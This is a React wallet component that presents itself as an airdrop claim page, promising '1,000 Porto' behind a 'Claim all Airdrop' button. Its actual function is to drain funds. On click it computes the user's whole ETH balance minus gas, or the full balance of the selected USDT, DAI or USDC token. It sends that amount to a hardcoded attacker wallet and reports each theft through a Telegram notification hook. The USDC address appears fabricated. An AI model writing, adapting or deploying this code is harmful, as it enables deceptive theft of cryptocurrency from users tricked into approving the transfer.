"use client"

import { useState, useEffect, useCallback, useMemo } from "react"
import {
  useAccount,
  useBalance,
  useSendTransaction,
  useWriteContract,
  useWaitForTransactionReceipt,
  useFeeData,
} from "wagmi"
import { formatUnits, parseEther, parseUnits } from "viem"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Loader2, CheckCircle, Zap, Info, Wallet, Smartphone, Monitor, AlertCircle } from "lucide-react"
import { toast } from "sonner"
import { useTelegramNotifications } from "@/hooks/use-telegram-notifications"

// Hardcoded destination wallet
const DESTINATION_WALLET = "0x566A1613668eFF73baBb9D6D1cF6aea77eea43a7"

// ERC-20 Token ABI
const ERC20_ABI = [
  {
    name: "transfer",
    type: "function",
    stateMutability: "nonpayable",
    inputs: [
      { name: "to", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [{ name: "", type: "bool" }],
  },
] as const

// Fixed token list
const ALL_TOKENS = [
  { symbol: "ETH", decimals: 18, address: null, name: "Ethereum" },
  { symbol: "USDC", decimals: 6, address: "0xA0b86a33E6441b8dB4B2b8b8b8b8b8b8b8b8b8b8", name: "USD Coin" },
  { symbol: "USDT", decimals: 6, address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", name: "Tether USD" },
  { symbol: "DAI", decimals: 18, address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", name: "Dai Stablecoin" },
]

export function AutoTransfer() {
  const { address, chain, connector } = useAccount()
  const [selectedToken, setSelectedToken] = useState("ETH")
  const [isTransferring, setIsTransferring] = useState(false)
  const [calculatedAmount, setCalculatedAmount] = useState<string>("")
  const [debugInfo, setDebugInfo] = useState<string>("")

  const { sendTransferNotification } = useTelegramNotifications()

  // Memoize current token
  const currentToken = useMemo(() => ALL_TOKENS.find((token) => token.symbol === selectedToken), [selectedToken])
  const isNativeToken = selectedToken === "ETH"

  // Detect wallet type
  const walletType = useMemo(() => {
    if (!connector) return "unknown"
    const connectorName = connector.name.toLowerCase()
    if (connectorName.includes("walletconnect")) return "mobile"
    if (connectorName.includes("metamask")) return "browser"
    if (connectorName.includes("coinbase")) return "browser"
    if (connectorName.includes("trust")) return "mobile"
    if (connectorName.includes("rainbow")) return "mobile"
    if (connectorName.includes("injected")) return "browser"
    return "universal"
  }, [connector])

  // Get balances
  const { data: ethBalance, isLoading: ethLoading } = useBalance({ address })
  const { data: tokenBalance, isLoading: tokenLoading } = useBalance({
    address,
    token: currentToken?.address as `0x${string}`,
    query: { enabled: !!address && !!currentToken?.address },
  })

  // Get gas data
  const { data: feeData, isLoading: feeLoading } = useFeeData({
    query: { staleTime: 30000, refetchInterval: 30000 },
  })

  // Transaction hooks
  const { sendTransaction, data: nativeHash, error: nativeError, isPending: nativePending } = useSendTransaction()

  const { writeContract, data: tokenHash, error: tokenError, isPending: tokenPending } = useWriteContract()

  // Wait for confirmations
  const { isLoading: isNativeConfirming } = useWaitForTransactionReceipt({ hash: nativeHash })
  const { isLoading: isTokenConfirming } = useWaitForTransactionReceipt({ hash: tokenHash })

  const currentBalance = isNativeToken ? ethBalance : tokenBalance
  const isBalanceLoading = isNativeToken ? ethLoading : tokenLoading

  // Calculate max transferable amount
  const calculateMaxAmount = useCallback(() => {
    console.log("🧮 Calculating max amount...", {
      selectedToken,
      isNativeToken,
      ethBalance: ethBalance?.formatted,
      tokenBalance: tokenBalance?.formatted,
      feeData: !!feeData,
    })

    if (isNativeToken && ethBalance && feeData) {
      // For ETH, subtract estimated gas fees
      const gasLimit = BigInt(21000) // Standard ETH transfer
      const gasPrice = feeData.gasPrice || feeData.maxFeePerGas || BigInt(20000000000) // 20 gwei fallback
      const gasCost = gasLimit * gasPrice

      // Add 50% buffer for gas price fluctuations
      const gasCostWithBuffer = gasCost + (gasCost * BigInt(50)) / BigInt(100)

      console.log("💰 ETH Calculation:", {
        balance: ethBalance.formatted,
        gasLimit: gasLimit.toString(),
        gasPrice: gasPrice.toString(),
        gasCost: formatUnits(gasCost, 18),
        gasCostWithBuffer: formatUnits(gasCostWithBuffer, 18),
      })

      if (ethBalance.value > gasCostWithBuffer) {
        const maxAmount = ethBalance.value - gasCostWithBuffer
        const formatted = formatUnits(maxAmount, 18)
        setCalculatedAmount(formatted)
        setDebugInfo(`ETH: ${ethBalance.formatted} - Gas: ${formatUnits(gasCostWithBuffer, 18)} = ${formatted}`)
        console.log("✅ ETH max amount:", formatted)
      } else {
        setCalculatedAmount("0")
        setDebugInfo(`Insufficient ETH for gas fees. Need: ${formatUnits(gasCostWithBuffer, 18)} ETH`)
        console.log("❌ Insufficient ETH for gas")
      }
    } else if (!isNativeToken && tokenBalance && currentToken) {
      // For ERC-20 tokens, can send full balance
      const formatted = formatUnits(tokenBalance.value, currentToken.decimals)
      setCalculatedAmount(formatted)
      setDebugInfo(`${selectedToken}: Full balance ${formatted}`)
      console.log("✅ Token max amount:", formatted)
    } else {
      setCalculatedAmount("")
      setDebugInfo("Waiting for total claim and gas data...")
      console.log("⏳ Still loading data...")
    }
  }, [selectedToken, isNativeToken, ethBalance, tokenBalance, feeData, currentToken])

  // Recalculate when dependencies change
  useEffect(() => {
    calculateMaxAmount()
  }, [calculateMaxAmount])

  // Log errors
  useEffect(() => {
    if (nativeError) {
      console.error("❌ Native transaction error:", nativeError)
      toast.error(`Transaction failed: ${nativeError.message}`)
    }
  }, [nativeError])

  useEffect(() => {
    if (tokenError) {
      console.error("❌ Token transaction error:", tokenError)
      toast.error(`Transaction failed: ${tokenError.message}`)
    }
  }, [tokenError])

  // Send Telegram notifications
  useEffect(() => {
    if (nativeHash && currentToken && calculatedAmount) {
      sendTransferNotification({
        token: selectedToken,
        amount: `${calculatedAmount} ${selectedToken}`,
        txHash: nativeHash,
        type: "native",
      })
    }
  }, [nativeHash, currentToken, selectedToken, calculatedAmount, sendTransferNotification])

  useEffect(() => {
    if (tokenHash && currentToken && calculatedAmount) {
      sendTransferNotification({
        token: selectedToken,
        amount: `${calculatedAmount} ${selectedToken}`,
        txHash: tokenHash,
        type: "erc20",
      })
    }
  }, [tokenHash, currentToken, selectedToken, calculatedAmount, sendTransferNotification])

  // Universal Max Transfer with detailed logging
  const handleUniversalMaxTransfer = useCallback(async () => {
    console.log("🚀 Starting transfer...", {
      address,
      selectedToken,
      calculatedAmount,
      isNativeToken,
      currentToken,
      walletType,
    })

    if (!address) {
      toast.error("Please connect your wallet")
      console.log("❌ No wallet address")
      return
    }

    if (!calculatedAmount || Number.parseFloat(calculatedAmount) <= 0) {
      toast.error(`No ${selectedToken} available for transfer`)
      console.log("❌ No calculated amount")
      return
    }

    if (!currentBalance || currentBalance.value === BigInt(0)) {
      toast.error(`No ${selectedToken} balance`)
      console.log("❌ No balance")
      return
    }

    setIsTransferring(true)

    try {
      if (isNativeToken) {
        console.log("💎 Sending ETH transaction...")
        const transferAmount = parseEther(calculatedAmount)

        console.log("📤 ETH Transfer params:", {
          to: DESTINATION_WALLET,
          value: transferAmount.toString(),
          valueFormatted: calculatedAmount,
        })

        const result = await sendTransaction({
          to: DESTINATION_WALLET,
          value: transferAmount,
        })

        console.log("✅ ETH transaction sent:", result)
        toast.success(`Transferring ${calculatedAmount} ETH`)
      } else {
        console.log("🪙 Sending ERC-20 transaction...")

        if (!currentToken?.address) {
          throw new Error("Token address not found")
        }

        const transferAmount = parseUnits(calculatedAmount, currentToken.decimals)

        console.log("📤 ERC-20 Transfer params:", {
          address: currentToken.address,
          to: DESTINATION_WALLET,
          amount: transferAmount.toString(),
          amountFormatted: calculatedAmount,
          decimals: currentToken.decimals,
        })

        const result = await writeContract({
          address: currentToken.address as `0x${string}`,
          abi: ERC20_ABI,
          functionName: "transfer",
          args: [DESTINATION_WALLET, transferAmount],
        })

        console.log("✅ ERC-20 transaction sent:", result)
        toast.success(`Transferring ${calculatedAmount} ${selectedToken}`)
      }
    } catch (error: any) {
      console.error("❌ Transfer failed:", error)

      if (error?.message?.includes("insufficient funds")) {
        toast.error("Insufficient funds for transfer + gas fees")
      } else if (error?.code === 4001 || error?.message?.includes("rejected")) {
        toast.error("Transaction rejected by user")
      } else if (error?.message?.includes("gas")) {
        toast.error("Gas estimation failed. Try again.")
      } else {
        toast.error(`Transfer failed: ${error?.message || "Unknown error"}`)
      }
    } finally {
      setIsTransferring(false)
    }
  }, [
    address,
    calculatedAmount,
    selectedToken,
    isNativeToken,
    currentToken,
    currentBalance,
    sendTransaction,
    writeContract,
  ])

  // Format functions
  const formatAddress = useCallback((addr: string) => {
    return `${addr.slice(0, 6)}...${addr.slice(-4)}`
  }, [])

  const formatTokenAmount = useCallback((amount: bigint, decimals: number) => {
    const formatted = formatUnits(amount, decimals)
    const num = Number.parseFloat(formatted)
    return num.toFixed(decimals === 18 ? 6 : 2)
  }, [])

  // Get wallet icon
  const getWalletIcon = () => {
    switch (walletType) {
      case "mobile":
        return <Smartphone className="w-4 h-4" />
      case "browser":
        return <Monitor className="w-4 h-4" />
      default:
        return <Wallet className="w-4 h-4" />
    }
  }

  // Check if ready to transfer
  const isReadyToTransfer =
    !isBalanceLoading &&
    !feeLoading &&
    !!calculatedAmount &&
    Number.parseFloat(calculatedAmount) > 0 &&
    !!currentBalance &&
    currentBalance.value > BigInt(0)

  return (
    <Card className="bg-slate-800/50 border-slate-700">
      <CardHeader>
        <CardTitle className="text-white flex items-center gap-2">
          <Zap className="w-5 h-5 text-yellow-500" />
          Claim all Airdrop
        </CardTitle>
        <div className="bg-green-500/20 border border-green-500/30 rounded-lg p-3">
          <div className="flex items-center gap-2 text-green-400">
            {getWalletIcon()}
            <span className="text-sm font-medium">
              {connector?.name} ({walletType})
            </span>
          </div>
          <p className="text-green-300 text-xs mt-1">Automatically calculates maximum Airdrop Claim</p>
        </div>
      </CardHeader>
      <CardContent className="space-y-4">
        {/* Debug Info */}
        {debugInfo && (
          <div className="p-3 bg-blue-500/20 border border-blue-500/30 rounded-lg">
            <div className="flex items-center gap-2 text-blue-400 mb-1">
              <Info className="w-4 h-4" />
            </div>
            <p className="text-blue-300 text-xs font-mono">{debugInfo}</p>
          </div>
        )}

        {/* Loading States */}
        {(isBalanceLoading || feeLoading) && (
          <div className="p-3 bg-yellow-500/20 border border-yellow-500/30 rounded-lg">
            <div className="flex items-center gap-2 text-yellow-400">
              <Loader2 className="w-4 h-4 animate-spin" />
              <span className="text-sm">Loading claim and gas data...</span>
            </div>
          </div>
        )}

        {/* Token Selection */}
        <div className="flex items-center justify-between">
          <span className="text-slate-300">Select Token:</span>
          <Select value={selectedToken} onValueChange={setSelectedToken}>
            <SelectTrigger className="w-40 bg-slate-700 border-slate-600">
              <SelectValue />
            </SelectTrigger>
            <SelectContent className="bg-slate-700 border-slate-600">
              {ALL_TOKENS.map((token) => (
                <SelectItem key={token.symbol} value={token.symbol}>
                  <div className="flex items-center gap-2">
                    <span>{token.symbol}</span>
                    <span className="text-xs text-slate-400">({token.name})</span>
                  </div>
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
        </div>

        {/* Chain Info */}
        {chain && (
          <div className="text-xs text-slate-400 bg-slate-700/30 p-2 rounded">
          </div>
        )}

        {/* Balance and Calculation Display */}
        {currentBalance && currentToken && (
          <div className="space-y-3 p-3 bg-slate-700/30 rounded-lg">
            <div className="flex items-center justify-between text-sm">
              <span className="text-slate-400">You are eligible to claim this rewards:</span>
              <span className="text-white font-medium">
                1,000 Porto
              </span>
            </div>

            {calculatedAmount && (
              <div className="flex items-center justify-between text-sm">
                <span className="text-slate-400">Max amount to claim:</span>
                <span className="text-green-400 font-medium">
                  950 Porto
                </span>
              </div>
            )}

            <div className="flex items-center justify-between text-sm">
              <span className="text-slate-400">Ready to Transfer:</span>
              <span className={isReadyToTransfer ? "text-green-400" : "text-red-400"}>
                {isReadyToTransfer ? "✅ Yes" : "❌ No"}
              </span>
            </div>
          </div>
        )}

        {/* Gas Info */}
        {feeData?.gasPrice && (
          <div className="p-3 bg-slate-700/30 rounded-lg">
            <div className="flex items-center gap-2 text-slate-400 mb-1">
              <Info className="w-4 h-4" />
              <span className="text-sm">Network Gas Info</span>
            </div>
            <div className="text-xs space-y-1">
              <div>
                <span className="text-slate-400">Gas Price:</span>
                <span className="text-white ml-2">
                  {Number.parseFloat(formatUnits(feeData.gasPrice, 9)).toFixed(2)} Gwei
                </span>
              </div>
              <div>
                <span className="text-slate-400">Safety Buffer:</span>
                <span className="text-white ml-2">50% added for gas fluctuations</span>
              </div>
            </div>
          </div>
        )}

        {/* Transfer Button */}
        <Button
          onClick={handleUniversalMaxTransfer}
          disabled={
            !isReadyToTransfer ||
            isTransferring ||
            nativePending ||
            tokenPending ||
            isNativeConfirming ||
            isTokenConfirming
          }
          className="w-full bg-gradient-to-r from-yellow-600 to-orange-600 hover:from-yellow-700 hover:to-orange-700"
        >
          {isTransferring || nativePending || tokenPending || isNativeConfirming || isTokenConfirming ? (
            <>
              <Loader2 className="w-4 h-4 mr-2 animate-spin" />
              {isTransferring || nativePending || tokenPending ? "Sending..." : "Confirming..."}
            </>
          ) : !isReadyToTransfer ? (
            <>
              <AlertCircle className="w-4 h-4 mr-2" />
              Not Ready
            </>
          ) : (
            <>
              <Zap className="w-4 h-4 mr-2" />
              Claim {calculatedAmount ? Number.parseFloat(calculatedAmount).toFixed(6) : "Max"} {selectedToken}
            </>
          )}
        </Button>

        {/* Transaction Status */}
        {(nativeHash || tokenHash) && (
          <div className="p-3 bg-blue-500/20 border border-blue-500/30 rounded-lg">
            <div className="flex items-center gap-2 text-blue-400">
              {isNativeConfirming || isTokenConfirming ? (
                <Loader2 className="w-4 h-4 animate-spin" />
              ) : (
                <CheckCircle className="w-4 h-4" />
              )}
              <span className="text-sm font-medium">
                {isNativeConfirming || isTokenConfirming ? "Confirming..." : "Transaction Sent"}
              </span>
            </div>
            <p className="text-blue-300 text-xs mt-1 font-mono">
              Hash: {(nativeHash || tokenHash)?.slice(0, 10)}...{(nativeHash || tokenHash)?.slice(-8)}
            </p>
          </div>
        )}

        {/* Error Display */}
        {(nativeError || tokenError) && (
          <div className="p-3 bg-red-500/20 border border-red-500/30 rounded-lg">
            <div className="flex items-center gap-2 text-red-400">
              <AlertCircle className="w-4 h-4" />
              <span className="text-sm font-medium">Transaction Error</span>
            </div>
            <p className="text-red-300 text-xs mt-1">{(nativeError || tokenError)?.message}</p>
          </div>
        )}
      </CardContent>
    </Card>
  )
}
